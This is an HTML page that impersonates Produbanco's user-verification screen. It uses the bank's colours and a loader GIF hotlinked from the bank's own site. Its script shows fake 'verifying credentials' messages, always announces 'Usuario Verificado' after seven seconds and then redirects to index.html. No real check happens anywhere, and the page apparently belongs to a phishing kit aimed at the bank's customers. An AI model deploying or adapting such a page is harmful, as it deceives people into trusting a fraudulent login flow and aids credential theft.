<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificando usuario - Produbanco</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: #003F20;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 0;
            margin: 0;
        }

        .container {
            width: 100%;
            max-width: 100vw;
            min-height: 100vh;
            background: #003F20;
            position: relative;
            display: flex;
            flex-direction: column;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 25px;
            margin-top: 10px;
        }

        .menu-icon {
            display: flex;
            flex-direction: column;
            cursor: pointer;
        }

        .menu-icon span {
            width: 25px;
            height: 2px;
            background: white;
            margin: 3px 0;
            border-radius: 1px;
        }

        .phone-icon {
            cursor: pointer;
        }

        .logo-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top: 30px;
            margin-bottom: 30px;
        }

        .logo-img {
            width: auto;
            max-width: 380px;
            height: 140px;
            object-fit: contain;
            margin-bottom: 15px;
            filter: brightness(1.1);
        }

        .logo-subtitle {
            color: white;
            font-size: 16px;
            font-weight: 300;
            opacity: 0.9;
        }

        .verification-container {
            background: white;
            border-radius: 25px 25px 0 0;
            flex: 1;
            padding: 50px 25px;
            min-height: 500px;
            width: 100%;
            overflow: hidden;
            box-shadow: 0 -5px 20px rgba(0, 0, 0, 0.15);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
        }

        .verification-title {
            color: #003F20;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 15px;
            transition: all 0.5s ease;
        }

        .verification-subtitle {
            color: #666;
            font-size: 18px;
            font-weight: 400;
            margin-bottom: 40px;
            line-height: 1.4;
            transition: all 0.5s ease;
        }

        .loader-container {
            position: relative;
            margin-bottom: 30px;
        }

        .loader-gif {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            transition: all 0.5s ease;
        }

        .success-animation {
            width: 120px;
            height: 120px;
            background: #28a745;
            border-radius: 50%;
            display: none;
            align-items: center;
            justify-content: center;
            animation: successPulse 0.6s ease-out;
            position: relative;
            overflow: hidden;
        }

        .success-animation::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: radial-gradient(circle, rgba(255,255,255,0.3) 0%, rgba(255,255,255,0) 70%);
            border-radius: 50%;
            animation: shimmer 1.5s infinite;
        }

        .checkmark {
            width: 60px;
            height: 60px;
            position: relative;
        }

        .checkmark-path {
            stroke: white;
            stroke-width: 4;
            fill: none;
            stroke-linecap: round;
            stroke-linejoin: round;
            stroke-dasharray: 100;
            stroke-dashoffset: 100;
            animation: drawCheck 0.8s ease-out forwards;
        }

        @keyframes successPulse {
            0% {
                transform: scale(0.8);
                opacity: 0;
            }
            50% {
                transform: scale(1.1);
            }
            100% {
                transform: scale(1);
                opacity: 1;
            }
        }

        @keyframes drawCheck {
            to {
                stroke-dashoffset: 0;
            }
        }

        @keyframes shimmer {
            0%, 100% {
                opacity: 0.3;
            }
            50% {
                opacity: 0.8;
            }
        }

        .progress-container {
            width: 100%;
            max-width: 300px;
            height: 8px;
            background: #f0f0f0;
            border-radius: 10px;
            overflow: hidden;
            margin-bottom: 20px;
        }

        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #003F20, #28a745);
            border-radius: 10px;
            width: 0%;
            transition: width 0.3s ease;
            animation: progressAnimation 10s linear forwards;
        }

        @keyframes progressAnimation {
            0% { width: 0%; }
            70% { 
                width: 70%; 
                background: linear-gradient(90deg, #003F20, #005a2e);
            }
            100% { 
                width: 100%; 
                background: linear-gradient(90deg, #28a745, #20c997);
            }
        }

        .verification-message {
            color: #888;
            font-size: 14px;
            font-weight: 400;
            opacity: 0.8;
            transition: all 0.5s ease;
        }

        .dots {
            animation: loadingDots 1.5s infinite;
        }

        @keyframes loadingDots {
            0%, 20% { opacity: 0; }
            50% { opacity: 1; }
            100% { opacity: 0; }
        }

        /* Estados para cambio a los 7 segundos */
        .verified .verification-title {
            color: #28a745;
            font-size: 26px;
        }

        .verified .verification-subtitle {
            color: #28a745;
            font-size: 16px;
        }

        .verified .verification-message {
            color: #28a745;
            font-weight: 600;
            font-size: 16px;
        }

        /* Responsive adjustments */
        @media (max-width: 450px) {
            .container {
                max-width: 100%;
            }
            
            .verification-container {
                padding: 40px 20px;
            }
            
            .logo-img {
                max-width: 320px;
                height: 120px;
            }
            
            .verification-title {
                font-size: 20px;
            }
            
            .verification-subtitle {
                font-size: 16px;
            }
            
            .loader-gif,
            .success-animation {
                width: 100px;
                height: 100px;
            }
            
            .checkmark {
                width: 50px;
                height: 50px;
            }
        }

        .fade-in {
            animation: fadeIn 1s ease-in;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Animación de éxito final */
        .final-success {
            animation: finalSuccess 1s ease-out;
        }

        @keyframes finalSuccess {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
    </style>
</head>
<body>
    <div class="container fade-in">
        <!-- Header -->
        <div class="header">
            <div class="menu-icon">
                <span></span>
                <span></span>
                <span></span>
            </div>
            <div class="phone-icon">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
                    <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
                </svg>
            </div>
        </div>

        <!-- Logo -->
        <div class="logo-container">
            <img src="logo1.png" alt="Grupo Promerica Logo" class="logo-img">
            <p class="logo-subtitle"></p>
        </div>

        <!-- Verification Container -->
        <div class="verification-container" id="verificationContainer">
            <h1 class="verification-title" id="verificationTitle">Verificando credenciales</h1>
            <p class="verification-subtitle" id="verificationSubtitle">Procesando tu información de seguridad</p>
            
            <div class="loader-container" id="loaderContainer">
                <img src="https://www.produbanco.com/Produnet/Imagen/DesignSystem/loader.gif" 
                     alt="Cargando..." 
                     class="loader-gif"
                     id="loaderGif">
                
                <div class="success-animation" id="successAnimation">
                    <svg class="checkmark" viewBox="0 0 52 52">
                        <path class="checkmark-path" d="M14.1 27.2l7.1 7.2 16.7-16.8" />
                    </svg>
                </div>
            </div>
            
            <div class="progress-container">
                <div class="progress-bar" id="progressBar"></div>
            </div>
            
            <p class="verification-message" id="verificationMessage">
                Validando información<span class="dots">...</span>
            </p>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Elementos del DOM
            const verificationContainer = document.getElementById('verificationContainer');
            const verificationTitle = document.getElementById('verificationTitle');
            const verificationSubtitle = document.getElementById('verificationSubtitle');
            const loaderGif = document.getElementById('loaderGif');
            const successAnimation = document.getElementById('successAnimation');
            const verificationMessage = document.getElementById('verificationMessage');

            // Variables de control
            let timeRemaining = 10;
            let redirected = false;
            let verificationComplete = false;

            // Función para redirigir
            function redirectToIndex() {
                if (!redirected) {
                    redirected = true;
                    window.location.href = 'index.html';
                }
            }

            // Función para mostrar verificación exitosa
            function showSuccessVerification() {
                if (verificationComplete) return;
                verificationComplete = true;

                // Cambiar contenedor a estado verificado
                verificationContainer.classList.add('verified');
                
                // Actualizar textos
                verificationTitle.textContent = '✓ Usuario Verificado';
                verificationSubtitle.textContent = 'Tu identidad ha sido confirmada exitosamente';
                verificationMessage.innerHTML = 'Acceso autorizado <strong>✓</strong>';

                // Ocultar GIF de carga y mostrar animación de éxito
                loaderGif.style.display = 'none';
                successAnimation.style.display = 'flex';

                // Efecto final en el contenedor
                setTimeout(() => {
                    verificationContainer.classList.add('final-success');
                }, 500);

                console.log('✓ Verificación exitosa mostrada');
            }

            // Configurar timer principal de 10 segundos
            const redirectTimer = setTimeout(redirectToIndex, 10000);

            // Configurar cambio a verificación exitosa a los 7 segundos
            const successTimer = setTimeout(showSuccessVerification, 7000);

            // Mensajes rotativos para los primeros 7 segundos
            const loadingMessages = [
                'Validando información',
                'Verificando credenciales',
                'Procesando datos de seguridad',
                'Confirmando identidad',
                'Autenticando usuario'
            ];

            let messageIndex = 0;
            const messageTimer = setInterval(function() {
                if (!verificationComplete && !redirected) {
                    verificationMessage.innerHTML = loadingMessages[messageIndex] + '<span class="dots">...</span>';
                    messageIndex = (messageIndex + 1) % loadingMessages.length;
                } else {
                    clearInterval(messageTimer);
                }
            }, 1400); // Cambiar cada 1.4 segundos

            // Contador de tiempo (opcional para debug)
            const countdownTimer = setInterval(function() {
                if (timeRemaining > 0 && !redirected) {
                    timeRemaining--;
                    console.log(`Tiempo restante: ${timeRemaining} segundos${timeRemaining === 3 ? ' - Mostrando verificación exitosa' : ''}`);
                } else {
                    clearInterval(countdownTimer);
                }
            }, 1000);

            // Limpiar timers si la página se cierra
            window.addEventListener('beforeunload', function() {
                clearTimeout(redirectTimer);
                clearTimeout(successTimer);
                clearInterval(messageTimer);
                clearInterval(countdownTimer);
            });

            // Precargar la página index.html para transición más rápida
            const link = document.createElement('link');
            link.rel = 'preload';
            link.href = 'index.html';
            link.as = 'document';
            document.head.appendChild(link);

            // Mensajes de consola para debug
            console.log('🔄 Página de verificación iniciada');
            console.log('⏱️ Cambio a éxito en 7 segundos');
            console.log('🔗 Redirección en 10 segundos');
        });
    </script>
</body>
</html>